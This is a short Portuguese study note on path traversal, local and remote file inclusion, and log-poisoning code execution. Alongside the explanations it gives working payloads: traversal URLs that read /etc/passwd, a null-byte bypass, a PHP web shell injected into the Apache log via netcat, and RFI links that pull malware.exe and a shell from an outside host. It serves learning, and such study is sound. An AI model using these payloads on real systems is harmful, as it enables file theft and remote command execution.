# Full Path Disclosure | Path Traversal | Directory Traversal
Path Traversal ou Directory Traversal é uma vulnerabilidade que ocorre quando é possível navegar entre diretórios através de um parâmetro GET na URL usando o comando "../" para listar todos os diretórios anteriores. Através dessa vulnerabilidade, é possível encontrar arquivos sensíveis que, se colocados na URL, podem visualizar seu conteúdo e encontrar informações confidenciais.

Exemplo: http://172.16.1.10/turismo/logado.php?banners=../../../../../../../etc/passwd
## Local File Inclusion (LFI)
Local File Inclusion ocorre quando o usuário consegue incluir e executar arquivos locais no servidor, manipulando os parâmetros da solicitação para incluir arquivos maliciosos no código do aplicativo. Em códigos que adicionam uma extensão de arquivo ao final da solicitação, é possível contornar isso adicionando um byte nulo (%00) ao final da solicitação.

Exemplo: http://172.16.1.231/index.php?page=../../../../../../../etc/passwd%00
### Remote Code Execution através de LFI
Remote code injection através do arquivo de logs do servidor (/var/log/apachje2/access.log) é possível se o servidor interpretar o código passado para o log. No exemplo a seguir, o código chama a função do sistema e, por meio do parâmetro GET, executa o código passado remotamente no servidor.

Código para enviar ao servidor: `nc -v 172.16.1.10 80 -C` -> Código PHP
Código PHP: `<?php system($_GET['parameter']); ?>`

## Remote File Inclusion (RFI)
Remote File Inclusion ocorre quando o servidor executa código remotamente de outro servidor, então é possível fazer upload de um servidor e enviar código malicioso para o servidor, para executar código remotamente por meio de um parâmetro, assim como no RCE por meio de LFI

Exemplo: http://172.16.1.10/turismo/link.php?link=http://172.16.1.30:8080/malware.exe
Exemplo: http://172.16.1.10/turismo/link.php?link=http://172.16.1.30:8080/shell.html&hack=id